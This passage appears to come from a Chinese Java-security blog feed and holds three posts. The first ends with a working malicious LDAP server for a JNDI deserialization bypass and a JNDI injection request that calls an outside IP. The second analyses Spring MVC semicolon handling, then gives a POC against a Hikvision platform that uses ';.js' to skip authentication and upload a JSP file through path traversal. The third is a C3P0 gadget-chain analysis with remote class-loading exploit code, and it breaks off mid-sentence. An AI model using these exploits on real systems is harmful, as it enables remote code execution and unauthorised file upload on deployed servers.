class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> JNDIBypass;<br><br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><span class="hljs-keyword">import</span> com.unboundid.util.Base64;<br><span class="hljs-keyword">import</span> org.apache.commons.io.FileUtils;<br><br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-comment">//高版本LDAP绕过</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAPServer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] tmp_args )</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">if</span> (tmp_args.length &lt; <span class="hljs-number">2</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Usage: java xxx.jar &lt;IP&gt; &lt;file&gt;&quot;</span>);<br>            System.exit(<span class="hljs-number">1</span>);<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">=</span> tmp_args[<span class="hljs-number">0</span>];<br>        String[] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;http://&quot;</span> + ip +<span class="hljs-string">&quot;/#Evail&quot;</span>&#125;;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(tmp_args[<span class="hljs-number">1</span>]);<br>        <span class="hljs-keyword">try</span> &#123;<br>            payload = FileUtils.readFileToString(file);<br>            System.out.println(payload);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">6666</span>;<br><br>        <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>        config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                <span class="hljs-string">&quot;listen&quot;</span>, <span class="hljs-comment">//$NON-NLS-1$</span><br>                InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>), <span class="hljs-comment">//$NON-NLS-1$</span><br>                port,<br>                ServerSocketFactory.getDefault(),<br>                SocketFactory.getDefault(),<br>                (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>        config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(args[ <span class="hljs-number">0</span> ]), payload));<br>        <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>        System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>        ds.startListening();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-keyword">private</span> URL codebase;<br>        <span class="hljs-keyword">private</span> String payload;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb , String payload)</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>            <span class="hljs-built_in">this</span>.payload = payload;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e, payload);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">(InMemoryInterceptedSearchResult result, String base, Entry e , String payload)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br><br>            e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, Base64.decode(payload));<br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>‍</p><p>以jar的形式开启，并且传入序列化的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar LDAPServer.jar ip 1.txt<br></code></pre></td></tr></table></figure><p>然后用JNDI去找IP+PORT即可成功反弹</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121789.png" alt="image">​​</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">GET /&#123;&#123;urlenc($&#123;jndi:ldap://152.136.46.28:6666/Evail&#125;)&#125;&#125; HTTP/1.1<br>Host: node5.anna.nssctf.cn:28379<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全 - Spring Web MVC 请求解析过程</title>
    <link href="/post/java-security-spring-web-mvc-request-analysis-process-z1azjfg.html"/>
    <url>/post/java-security-spring-web-mvc-request-analysis-process-z1azjfg.html</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>主要是有师傅对一些鉴权的Spring不太懂，并且自身也有不太清楚的地方于是跟下 Spring Web MVC 请求解析过程</p><p>‍</p><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>当我们发出请求的时候，会被</p><p><code>\spring-webmvc-5.3.23.jar!\org\springframework\web\servlet\DispatcherServlet.java#service()</code>​ 所拦截(在父类<code>FrameworkServlet</code>​实现了)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401162234021.png" alt="image">​</p><p>获取请求方式，只要不是<code>PATCH</code>​的请求就会去调用<code>FrameworkServlet</code>​的父类<code>HttpServletBean</code>​的父类<code>HttpServlet</code>​的<code>service</code>​方法</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401162234356.png" alt="image">​</p><p>这里实际上是根据不同的请求方法，调用对应的方法，例如<code>GET</code>​请求会调用<code>doGet</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401162234762.png" alt="image">​</p><p>最后调用<code>processRequest</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401162234951.png" alt="image">​</p><p>在这里调用了<code>doService</code>​方法之后</p><p>还继续把请求包和返回包传入<code>doDispatch</code>​方法中</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401162234184.png" alt="image">​</p><p>在<code>doDispatch</code>​方法中，首先会对<code>multipart</code>​请求进行处理，然后获取对应的<code>mappedHandler</code>​,如何获取呢，其实就是使用了<code>getHandler</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401162234591.png" alt="image">​</p><p>跟进<code>getHandler</code>​方法，发现是循环调用<code>handlerMappings</code>​数组的<code>getHandler</code>​方法对我们的请求报文进行处理</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401162234859.png" alt="image">​</p><p>跟进第一个值的<code>getHandler</code>​方法，也就是<code>\spring-webmvc-5.3.23-sources.jar!\org\springframework\web\servlet\handler\AbstractHandlerMapping.java#getHandler()</code>​，他先进行了一次<code>getHandlerInternal</code>​方法对请求的报文进行处理</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401162234125.png" alt="image">​</p><p>跟进<code>getHandlerInternal</code>​方法，发现是从<code>request</code>​对象中获取请求的<code>path</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401162234392.png" alt="image">​</p><p>跟进<code>initLookupPath</code>​，初始化请求映射的路径，并且通过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">lookupPath</span> <span class="hljs-operator">=</span> requestPath.pathWithinApplication().value();<br></code></pre></td></tr></table></figure><p>最后获取到我们请求的路径<code>/hello;</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401162234612.png" alt="image">​</p><p>接下来就去用到<code>UrlPathHelper</code>​工具类的<code>removeSemicolonContent</code>​方法，对于当前处理的URI，如果设置了<code>setRemoveSemicolonContent</code>​属性为<code>true</code>​，则继续把路径丢给<code>removeSemicolonContentInternal</code>​方法，否则删除<code>Jsessionid</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401162234907.png" alt="image">​</p><p>然后这个方法其实就是去寻找<code>;</code>​ 并且删除掉<code>;</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401162234095.png" alt="image">​</p><p>这里可以仔细去看看他的删除逻辑，也可以本地写个demo测一下即可，我本地测了一下之后解释如下</p><ol><li>先找到<code>;</code>​的位置 比如 <code>/jsp/files;.js</code>​ 他就会找到<code>;</code>​之前一共有几位 这里就是<code>10</code>​位</li><li>然后接下来就是做判断，判断<code>;</code>​后面是否存在<code>/</code>​，如果存在<code>/</code>​，则继续索引，比如<code>/hello/..;1111/hello</code>​ 这里就是会索引到第<code>14</code>​位，然后把索引到的两个数字丢进<code>delete</code>​去截取(简单理解为就是删掉<code>;</code>​之后到<code>/</code>​的所有字符串)</li><li>如果不存在<code>/</code>​就直接返回<code>;</code>​之前的东西就行</li></ol><p>‍</p><p>所以返回的结果就会删掉了<code>;</code>​以及其后面的内容了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401162234295.png" alt="image">​</p><p>接着返回了我们请求的路径后就把我们的路径作为参数给到<code>lookupHandlerMethod</code>​ 方法调用,首先直接根据路径获取对应的Mapping，获取不到的话调用<code>addMatchingMappings</code>​遍历所有的<code>ReuqestMappingInfo</code>​对象并进行匹配</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401162234665.png" alt="image">​</p><p>跟进<code>addMatchingMappings</code>​ ，遍历识别到的<code>ReuqestMappingInfo</code>​对象并进行匹配</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401162234984.png" alt="image">​</p><p>再去调用 <code>getMatchingMapping</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401162234173.png" alt="image">​</p><p>跟进<code>getMatchingCondition</code>​方法，<code>getMatchingCondition</code>​不同版本的实现也是不一样的，高版本会使用<code>PathPattern</code>​来进行URL匹配（不同版本会有差异，在 2.6之前，默认使用的是AntPathMatcher进行的字符串模式匹配）</p><p>接着走到核心点再次调用<code>getMatchingCondition</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401162234390.png" alt="image">​</p><p>进入到<code>\spring-webmvc-5.3.23-sources.jar!\org\springframework\web\servlet\mvc\condition\PathPatternsRequestCondition.java#getMatchingCondition()</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401162234608.png" alt="image">如果模式与路径相等，直接返回模式，否则进行后缀模式匹配，这里涉及到两个属性<code>SuffixPatternMatch</code>​&amp;<code>TrailingSlashMatch</code>​，根据这两个属性的boolean值会调用<code>pathMatcher#match</code>​方法进行进一步的匹配</p><p>这里就小跟一下罢了，剩下的就要再深层点了</p><p>‍</p><p>‍</p><h1 id="审计案例"><a href="#审计案例" class="headerlink" title="审计案例"></a>审计案例</h1><p>‍</p><h2 id="海康威视综合安防系统"><a href="#海康威视综合安防系统" class="headerlink" title="海康威视综合安防系统"></a>海康威视综合安防系统</h2><p>‍</p><p>POC</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /center/api/files;.js HTTP/1.1<br>User-Agent: PostmanRuntime/7.29.2<br>Accept: */*<br>Postman-Token: 1ac225cc-bdbe-4176-b806-a9a7c796ee33<br>Host: xxxxxxxxxxxxxx<br>Connection: close<br>Content-Type: multipart/form-data; boundary=--------------------------180188939909122941133151<br>Cookie: JSESSIONID=A0A01DAF36544051C724ABCCB20A0EA6<br>Content-Length: 286<br><br>----------------------------180188939909122941133151<br>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/hello.jsp&quot;<br>Content-Type: application/octet-stream<br><br>hello<br>----------------------------180188939909122941133151--<br></code></pre></td></tr></table></figure><p>‍</p><p>CAS的配置如下，其实就是以下的接口或者说是后缀是不鉴权的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401162234828.png" alt="image">​</p><p>找到上传的控制器</p><p><code>/bin/tomcat/apache-tomcat/webapps/center/WEB-INF/classes/com/hikvision/center/module/faq/controller/KnowledgeController.java#uploadFile()</code>​</p><p>发现是把上传的文件名取出来直接丢到了<code>son = this.knowledgeService.uploadFile(file);</code>​中</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401162234205.png" alt="image">​</p><p>跟进<code>knowledgeService.uploadFile</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401162234426.png" alt="image">​</p><p>发现也就是单纯拼接文件名并没有过滤，但是因为会鉴权，然后因为CAS的配置文件的问题，所以我们可以巧妙的利用SpringbootWebMVC的<code>removeSemicolonContentInternal</code>​通过<code>;</code>​来与不鉴权的后缀进行拼接从而映射到该路由下</p><p>‍</p><p><code>/center/api/files</code>​ -&gt; 鉴权</p><p><code>/center/api/files;.js</code>​ -&gt; 不鉴权 -&gt; 可以删除<code>;.js</code>​</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全 - C3P0链原理分析</title>
    <link href="/post/java-securityc3p0-chain-original-analysis-duplicated-20240113-17-05-58-cgbxn.html"/>
    <url>/post/java-securityc3p0-chain-original-analysis-duplicated-20240113-17-05-58-cgbxn.html</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇文章首发在先知社区(为先知打Call) 作者Zjacky(本人) 先知社区名称: <code>Zjacky</code> 原文链接为<a href="https://xz.aliyun.com/t/13858">https://xz.aliyun.com/t/13858</a> </p><p>‍</p><h2 id="C3P0是啥？"><a href="#C3P0是啥？" class="headerlink" title="C3P0是啥？"></a>C3P0是啥？</h2><p>‍</p><p>C3P0 是一个开源的 JDBC 连接池，它实现了数据源和 JNDI 绑定，支持 JDBC3 规范和 JDBC2 的标准扩展，并且C3P0其实就是JDBC的一部分吧，先来解释一下 啥叫连接池</p><p>‍</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">连接池类似于线程池，在一些情况下我们会频繁地操作数据库，此时Java在连接数据库时会频繁地创建或销毁句柄，增大资源的消耗。为了避免这样一种情况，我们可以提前创建好一些连接句柄，需要使用时直接使用句柄，不需要时可将其放回连接池中，准备下一次的使用。类似这样一种能够复用句柄的技术就是池技术<br></code></pre></td></tr></table></figure><p>‍</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>‍</p><p>jdk8u65</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mchange<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>c3p0<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>‍</p><h2 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h2><p>‍</p><p>C3P0常见的利用方式有如下三种</p><ul><li>URLClassLoader远程类加载</li><li>JNDI注入</li><li>利用HEX序列化字节加载器进行反序列化攻击</li></ul><p>‍</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>‍</p><h3 id="C3P0-之-URLClassLoader-的链子"><a href="#C3P0-之-URLClassLoader-的链子" class="headerlink" title="C3P0 之 URLClassLoader 的链子"></a>C3P0 之 URLClassLoader 的链子</h3><p>‍</p><p>先来回顾下<code>URLClassLoader</code>​的类加载</p><p>‍</p><p>如果说我们可以控制URLclassLoader或者他的参数就可以自定义字节码加载并且支持多种协议 <code>file</code>​ <code>jar</code>​ <code>http</code>​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;file:///E:\\Java_project\\Serialization_Learing\\target\\classes&quot;</span>)&#125;);<br>Class&lt;?&gt; cl = urlClassLoader.loadClass(<span class="hljs-string">&quot;Test&quot;</span>);<br>cl.newInstance();<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710914.png" alt="image">​</p><p>作者在<code>\mchange-commons-java-0.2.11.jar!\com\mchange\v2\naming\ReferenceableUtils.java#referenceToObject()</code>​中找到类似的<code>URLClassLoader</code>​的执行</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710296.png" alt="image">​</p><p>相当于一个完整的类加载了，那么接下来去找找谁去调用了<code>ReferenceableUtils.referenceToObject()</code>​</p><p>‍</p><p>于是找到了<code>ReferenceIndirector</code>​ 类的 <code>getObject()</code>​ 方法调用了<code>referenceToObject()</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710561.png" alt="image">​</p><p>再往上跟谁调用了<code>getObject</code>​方法，就直接找到了<code>PoolBackedDataSourceBase#readObject()</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710220.png" alt="image">​</p><p>其实蛮简单的，也不是很绕，也就三步，利用链如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">PoolBackedDataSourceBase<span class="hljs-comment">#readObject -&gt;</span><br>ReferenceSerialized<span class="hljs-comment">#getObject -&gt;</span><br>ReferenceableUtils<span class="hljs-comment">#referenceToObject -&gt;</span><br>ObjectFactory<span class="hljs-comment">#getObjectInstance</span><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710499.png" alt="image">​</p><p>‍</p><p>接下来就是写EXP了，先尝试把后半段链子写出来</p><p>写的时候要注意的点</p><ol><li>要用反射去调用<code>referenceToObject</code>​方法</li><li><code>referenceToObject</code>​方法需要三个传参 <code>Reference var0, Name var1, Context var2, Hashtable var3</code>​</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.Name;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.mchange.v2.naming.ReferenceableUtils&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;referenceToObject&quot;</span>, Reference.class, Name.class, Context.class, Hashtable.class);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;evilexp&quot;</span>,<span class="hljs-string">&quot;evilexp&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>); <span class="hljs-comment">//evilexp 就是恶意类</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span>  m.invoke(c,reference,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710671.png" alt="image">​</p><p>那么后半条链子已经完成了，我们再来看看如何跟前半条链子进行拼接呢？</p><p>‍</p><p>我们来仔细看看<code>PoolBackedDataSourceBase#readObject</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710984.png" alt="image">​</p><p>如果反序列化得到的类是<code>IndirectlySerialized</code>​的实例，则会调用其<code>getObject()</code>​方法，然后将返回的类转为<code>ConnectionPoolDataSource</code>​类，所以我们来跟进下这个<code>ConnectionPoolDataSource</code>​类发现他竟然没有继承<code>Serializable</code>​接口</p><blockquote><p>这里要有个点注意的，可能Java基础不太好的话可能不太清楚为啥这个<code>ConnectionPoolDataSource</code>​一定要继承<code>Serializable</code>​接口，因为在Java反序列化当中，序列化与反序列化的对象都得集成<code>Serializable</code>​接口从而给JVM标识，而这里<code>(ConnectionPoolDataSource) 